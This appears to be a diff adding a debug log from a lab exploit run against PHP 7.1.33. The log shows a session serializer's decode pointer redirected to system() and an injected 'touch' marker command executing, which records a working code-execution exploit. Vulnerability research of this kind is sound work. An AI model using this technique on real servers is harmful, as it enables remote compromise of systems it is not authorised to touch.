@@ -1,0 +1,18 @@
+master=1431309 child=1431310
+PID=1431310
+{  "n": 22,  "kind": "plant",  "label": "user_error",  "status": "X-Powered-By: PHP/7.1.33",  "error": null,  "elapsed": 0.0004,  "stdout": "X-Powered-By: PHP/7
+system=0x7ffff7d1c090
+P=0x7ffff7a55230 B0=0x7ffff7a6a000 plast=0x7ffff7a6f000 level=1 used=3
+rec={'rec1_len': 135, 'L': 130865, 'payload_start': 147, 'K': -8796083734814}
+DECODE hit=1 data=0x7ffff7a65000 val=0x7ffff7a65018 len=131014 level=1 bgdata=0x7ffff7a55230 ser2decode=0x4b0088 ser2name=php_binary
+0x7ffff7a65018:	0x742f206863756f74	0x636e65706f2f706d
+0x7ffff7a65028:	0x657365722f65646f	0x7265762f68637261
+0x7ffff7a65038:	0x325f78697274616d	0x5432323031363230
+0x7ffff7a65048:	0x2f5a353233343030	0x312e372f7362616c
+FLUSH n=1 ser2=0x7ffff7d1c090
+DECODE hit=2 data=0x7ffff7a86000 val=0x7ffff7a86018 len=131014 level=0 bgdata=(nil) ser2decode=0x7ffff7d1c090 ser2name=php_binary
+SYSTEM hit cmd=0x7ffff7a86018
+0x7ffff7a86018:	"touch /tmp/opencode/research/vermatrix_20261022T004325Z/labs/7.1.33/PASSTHRU_7133;#", ' ' <repeats 34 times>, "i:140737351106704;\001zs:130865:\""
+FLUSH n=2 ser2=0x7ffff7d1c090
+resp=b'X-Powered-By: PHP/7.1.33\r\nSet-Cookie: PHPSESSID=f7133; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-type: text/html; ch'
+marker=True worker_alive=True master_alive=True
